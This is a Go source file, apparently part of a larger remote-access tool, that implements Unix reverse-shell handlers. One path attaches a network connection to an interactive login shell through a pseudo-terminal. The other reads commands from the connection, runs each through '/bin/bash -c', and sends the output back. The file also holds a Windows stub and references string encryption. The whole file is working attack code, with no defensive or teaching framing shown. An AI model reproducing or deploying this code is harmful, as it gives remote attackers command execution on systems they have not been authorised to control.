//go:build !windows

package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/creack/pty"
)

func windowsReverseShell(conn net.Conn, encryptor *StringEncryptor) error {
	return nil // don't use this function on non-Windows
}

func unixReverseShell(conn net.Conn, interactive bool, encryptor *StringEncryptor) error {
	if interactive {
		return interactiveUnixShell(conn)
	} else {
		return nonInteractiveUnixShell(conn)
	}
}

// Interactive shell (pty)
func interactiveUnixShell(conn net.Conn) error {
	shell := os.Getenv("SHELL")
	if shell == "" {
		shell = "/bin/bash"
	}

	cmd := exec.Command(shell, "-l")
	cmd.Env = append(os.Environ(), "TERM=xterm-256color", "PS1=\\u@\\h:\\w\\$ ")

	ptmx, err := pty.Start(cmd)
	if err != nil {
		return fmt.Errorf("PTY start error: %v", err)
	}
	defer ptmx.Close()

	// Set terminal size
	pty.Setsize(ptmx, &pty.Winsize{Rows: 24, Cols: 80})

	exitChan := make(chan struct{}, 1)

	go func() {
		buf := make([]byte, 4096)
		var lineBuf string

		for {
			n, err := conn.Read(buf)
			if err != nil {
				break
			}
			data := string(buf[:n])
			lineBuf += data

			if strings.Contains(lineBuf, "\n") || strings.Contains(lineBuf, "\r") {
				if strings.TrimSpace(lineBuf) == "exit" {
					conn.Write([]byte("__CLIENT_EXIT__\r\n"))
					time.Sleep(100 * time.Millisecond)
					break
				}
				lineBuf = ""
			}

			ptmx.Write(buf[:n])
		}

		exitChan <- struct{}{}
	}()

	go func() {
		io.Copy(conn, ptmx)
		exitChan <- struct{}{}
	}()

	<-exitChan
	cmd.Process.Kill()
	cleanupConnection(conn)
	return nil
}

// Non-interactive shell (command-based)
func nonInteractiveUnixShell(conn net.Conn) error {
	defer conn.Close()
	reader := bufio.NewReader(conn)

	for {
		command, err := reader.ReadString('\n')
		if err != nil {
			if err == io.EOF {
				return nil
			}
			return fmt.Errorf("command reading error: %v", err)
		}

		command = strings.TrimSpace(command)
		if command == "" {
			continue
		}

		if command == "exit" {
			conn.Write([]byte("[!] Shell closed.\n"))
			return nil
		}

		cmd := exec.Command("/bin/bash", "-c", command)

		var out bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &out

		if err := cmd.Run(); err != nil {
			conn.Write([]byte(fmt.Sprintf("[X] Error: %v\n", err)))
		}

		conn.Write(out.Bytes())
	}

	return nil
}

func cleanupConnection(conn net.Conn) {
	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.CloseWrite()
		time.Sleep(100 * time.Millisecond)
		tcpConn.Close()
	} else {
		conn.Close()
	}
}
